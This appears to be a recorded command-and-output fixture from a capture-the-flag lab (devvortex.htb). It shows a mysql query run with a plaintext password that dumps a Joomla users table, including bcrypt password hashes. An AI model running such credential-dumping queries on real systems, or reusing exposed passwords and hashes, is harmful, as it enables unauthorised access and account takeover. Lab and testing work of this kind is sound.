@@ -1,0 +1,5 @@
+{"stdout":"id	name	username	email	password	block	sendEmail	registerDate	lastvisitDate	activation	params	lastResetTime	resetCount	otpKey	otep	requireReset	authProvider
+649	lewis	lewis	lewis@devvortex.htb	$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u	0	1	2023-09-25 16:44:24	2023-12-05 12:38:30	0		NULL	0			0	
+650	logan paul	logan	logan@devvortex.htb	$2y$10$IT4k5kmSGvHSO9d6M\/1w0eYiB5Ne9XzArQRFJTGThNiy\/yBtkIj12	0	0	2023-09-26 19:15:42	NULL		{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"timezone\":\"\",\"a11y_mono\":\"0\",\"a11y_contrast\":\"0\",\"a11y_highlight\":\"0\",\"a11y_font\":\"0\"}	NULL	0			0	
+","stderr":"mysql: [Warning] Using a password on the command line interface can be insecure.
+","exec":"echo SELECT \* FROM sd4fg_users | mysql --user=lewis --password=P4ntherg0t1n5r3c0n## joomla"}
